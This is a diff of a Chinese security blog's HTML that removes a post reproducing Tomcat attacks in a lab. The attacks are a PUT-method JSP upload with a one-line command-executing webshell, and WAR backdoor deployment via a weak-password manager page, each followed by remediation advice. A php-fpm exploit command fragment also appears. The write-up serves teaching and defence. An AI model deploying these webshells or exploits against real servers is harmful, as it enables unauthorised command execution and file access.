-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/03/tomcat-zhong-jian-jian-lou-dong/" itemprop="url">Tomcat中间件漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:48:51+08:00">
-                2020-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
-<h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
-<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
-<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
-<p>tomcat文件夹下的/conf/web.xml文件插入：</p>
-<pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p>
-<p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p>
-<pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p>
-<p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p>
-<p>弹出计算器：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p>
-<p><strong>3、 漏洞修复</strong></p>
-<p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
-<p>2）更新并升级至最新版。</p>
-<h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p>
-<p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
-<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
-<p><strong>2、漏洞复现</strong></p>
-<p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p>
-<p>访问后台，登陆：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p>
-<p>上传一个war包，里面是jsp后门：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p>
-<p>成功上传并解析，打开：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p>
-<p>可执行系统命令：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p>
-<p>也可进行文件管理，任意查看、删除、上传文件：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p>
-<p><strong>3、漏洞修复</strong></p>
-<p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
-<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p>
-<p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>
-<p>4）后台管理避免弱口令。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -5882,7 +6597,7 @@ python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
